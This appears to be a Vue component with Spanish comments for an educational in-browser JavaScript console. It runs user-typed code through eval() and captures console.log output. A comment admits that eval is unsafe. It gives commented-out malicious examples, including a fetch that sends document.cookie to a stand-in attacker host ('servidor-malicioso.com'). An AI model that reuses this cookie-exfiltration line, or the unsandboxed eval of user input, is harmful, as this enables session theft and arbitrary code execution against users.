<script setup lang="ts">
import { ref, watch, onMounted } from 'vue';

// Define las props que este componente puede recibir
const props = defineProps<{
  isVisible: boolean;
}>();

// Define los eventos que este componente puede emitir
const emit = defineEmits(['toggle-visibility']);

const codeInput = ref('');
const consoleOutput = ref('');

// Función para ejecutar el código
const runCode = () => {
  try {
    // Captura la salida de console.log
    const originalConsoleLog = console.log;
    let output = '';
    console.log = (...args: any[]) => {
      output += args.map(arg => {
        if (typeof arg === 'object' && arg !== null) {
          return JSON.stringify(arg, null, 2);
        }
        return String(arg);
      }).join(' ') + '\n';
    };
            //// CAMBIAR!!!!!!!!!!


    // El uso de `eval()` es una práctica **no aconsejada** en entornos de producción
    // debido a graves riesgos de seguridad (ejecución de código arbitrario) y problemas de rendimiento.
    // Para este proyecto educativo, se utiliza para permitir la ejecución interactiva de código,
    // asumiendo que el código es de confianza y con fines de aprendizaje.
    // EJEMPLO DE CÓDIGO MALICIOSO:
//               alert('¡Tu sesión ha sido secuestrada!');
//        document.body.innerHTML = '<h1>Sitio comprometido</h1>';
// O incluso intentar enviar datos a un servidor externo:
// fetch('https://servidor-malicioso.com/datos', { method: 'POST', body: JSON.stringify({ cookies: document.cookie }) });
    eval(codeInput.value);

    consoleOutput.value = output;
    console.log = originalConsoleLog; // Restaura console.log
  } catch (error: any) {
    consoleOutput.value = `Error: ${error.message}`;
  }
};

// Función para limpiar el código y la salida
const clearConsole = () => {
  codeInput.value = '';
  consoleOutput.value = '';
};

// Observa la prop isVisible para aplicar la clase 'hidden'
const consoleSectionRef = ref<HTMLElement | null>(null);
watch(() => props.isVisible, (newVal) => {
  console.log('Console isVisible changed to:', newVal); // Agregado para depuración
  if (consoleSectionRef.value) {
    if (newVal) {
      consoleSectionRef.value.classList.remove('hidden');
    } else {
      consoleSectionRef.value.classList.add('hidden');
    }
  }
}, { immediate: true }); // Ejecutar inmediatamente al montar para el estado inicial

onMounted(() => {
  console.log('Console.vue mounted. consoleSectionRef.value:', consoleSectionRef.value);
});

// Función para cargar código (se usará desde otros componentes)
// Esta función se puede exponer si es necesario que otros componentes carguen código
const loadCode = (code: string) => {
  codeInput.value = code;
};

// Exponer la función loadCode para que pueda ser llamada por otros componentes si es necesario
defineExpose({ loadCode }); // Esto es si se usa un ref en el padre para llamar a esta función
</script>

<template>
  <section id="console-section" :class="{ hidden: !isVisible }" ref="consoleSectionRef" :aria-hidden="!isVisible">
    <div class="input-column">
      <textarea
        id="code-input"
        placeholder="Escribe tu código aquí..."
        v-model="codeInput"
        aria-label="Code Input Area"
      ></textarea>
      <div class="button-group">
        <button id="clear-code" @click="clearConsole">Limpiar</button>
        <button id="run-code" @click="runCode">Ejecutar</button>
      </div>
    </div>
    <div class="output-column">
      <pre id="console-output" aria-label="Console Output" aria-live="polite">{{ consoleOutput }}</pre>
    </div>
  </section>
</template>

<style scoped>
/* Consola interactiva */
#console-section {
  align-items: stretch; /* Asegura que los elementos hijos se estiren a la misma altura */

  width: 90%;
  max-width: 800px;
  position: fixed;
  bottom: 20px; /* Ajusta la posición vertical para alinear con el botón de ocultar consola */
  right: 160px; /* Ajusta la posición para que no se superponga con el botón de ocultar consola */
  display: flex;
  flex-direction: row;
  justify-content: space-between;

  gap: 1rem;
  background-color: rgba(34, 34, 34, 0.85);
  backdrop-filter: blur(var(--blur-amount));
  border-radius: var(--border-radius);
  box-shadow: var(--shadow);
  padding: 1rem;
  z-index: 1000;
  transition: transform 0.3s ease, opacity 0.3s ease;

  opacity: 1;
}

#console-section.hidden {
  transform: translateY(100%);
  opacity: 0;
  pointer-events: none;
}

.input-column {
  flex: 1 1 250px;
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
  /* Eliminar padding-bottom y manejar el espacio con flexbox */
  justify-content: space-between; /* Empuja el textarea hacia arriba y los botones hacia abajo */
}


.button-group {
  display: flex;
  gap: 0.5rem;
  justify-content: flex-end; /* Alinea los botones a la derecha */
  margin-top: 0.5rem; /* Espacio entre el textarea y los botones */
}

#run-code, #clear-code {
  padding: 0.5rem 1rem;
  border: none;
  border-radius: 4px;
  color: white;
  font-weight: bold;
  cursor: pointer;
  transition: background 0.2s;
}

#run-code {
  background-color: #005f99;
}

#clear-code {
  background-color: #dc3545;
}

#run-code:hover {
  background-color: #007acc;
}

#clear-code:hover {
  background-color: #c82333;
}

.output-column {
  flex: 1 1 250px;
  padding: 0.5rem;
}

#code-input,
#console-output {
  flex: 1;
  min-height: 120px;
  padding: 0.75rem;
  border: none;
  border-radius: 4px;
  font-family: 'Consolas', monospace;
  font-size: 0.9rem;
  background-color: rgba(0, 0, 0, 0.3);
  color: #eee;
  overflow: auto;
  resize: none; /* Elimina el redimensionamiento del textarea */
  cursor: default; /* Asegura que el cursor sea el predeterminado */
}

/* Botón alineado al fondo de su columna */
#run-code {
  align-self: flex-end;
  padding: 0.5rem 1rem;
  background-color: #005f99;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: background 0.2s;
  font-size: 0.9rem;
}

#run-code:hover {
  background-color: #007acc;
}

/* Responsive: apila en móvil */
@media (max-width: 700px) {
  #console-section {
    bottom: 0;
    right: 0;
    width: 100%;
    max-width: none;
    flex-direction: column;      /* input sobre output */
    border-radius: 0;
  }
}

#toggle-console {
  position: fixed;
  bottom: 20px;
  right: 20px;
  z-index: 1001;
  padding: 8px 16px;
  background-color: #005f99;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: background-color 0.3s ease;
}

#toggle-console:hover {
  background-color: #007acc;
}
</style>
